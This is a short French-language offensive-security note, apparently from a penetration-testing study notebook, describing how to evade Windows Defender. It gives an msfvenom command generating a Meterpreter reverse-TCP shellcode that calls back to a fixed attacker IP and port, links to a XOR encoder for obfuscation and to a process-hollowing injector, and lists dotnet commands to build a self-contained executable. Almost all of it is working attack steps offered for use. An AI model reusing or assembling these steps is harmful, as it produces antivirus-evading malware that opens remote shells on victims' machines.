Contournement de la protection antivirale de Windows Defender avec une injection de shellcode préalablement obfusqué avec une fonction XOR.

#Steps

```sh
msfvenom --platform windows -a x64 -p windows/x64/meterpreter/reverse_tcp LPORT=4443 LHOST=192.168.45.128 EXITFUNC=thread -f csharp
```

Le script `XorCoder` pour obfusquer son payload avec une fonction XOR : [XorCoder](https://github.com/chvancooten/OSEP-Code-Snippets/blob/main/XOR%20Shellcode%20Encoder/Program.cs)

Créer un nouveau projet `.NET` en mode console dans et compiler le projet sous la forme d'un seul fichier exécutable intégrant ses librairies

```c#
dotnet new console
dotnet publish -p:PublishSingleFile=true -r win-x64 -c Release --self-contained true -p:PublishTrimmed=true
```

Le script de Process Hollowing pour injecter notre shellcode dans un processus en stand-by : [Process Hollowing](https://github.com/chvancooten/OSEP-Code-Snippets/blob/main/Shellcode%20Process%20Hollowing/Program.cs)


